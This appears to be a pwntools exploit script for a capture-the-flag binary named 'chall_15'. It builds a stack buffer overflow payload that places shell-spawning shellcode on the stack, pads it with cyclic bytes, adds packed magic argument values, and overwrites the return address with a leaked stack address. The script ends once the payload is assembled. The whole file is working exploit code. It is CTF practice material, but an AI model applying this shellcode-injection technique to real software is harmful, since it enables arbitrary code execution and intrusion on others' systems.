from pwn import *

context.arch = 'amd64'

"""
RELRO - NO LIBC
PIE - NO LIBC

NO STACK CANARY (BOF)
NX DISABLED (SHELLCODE)
"""

p = process('./chall_15')

# don't need to leak canary? Just basic shellcode with leaked variable address

shellcode = asm(shellcraft.sh())
offset = 0x120
arg1 = 0xb16b00b5
arg2 = 0xdeadd00d
args = 0xb16b00b5deadd00d
p.recvuntil(b'baked beans\n')

leak = int(p.recvline().decode('utf-8').strip(), 16)

payload_amt = offset - len(shellcode) - 0x8

payload = shellcode + cyclic(payload_amt) + p64(args) + cyclic(8) + p64(leak)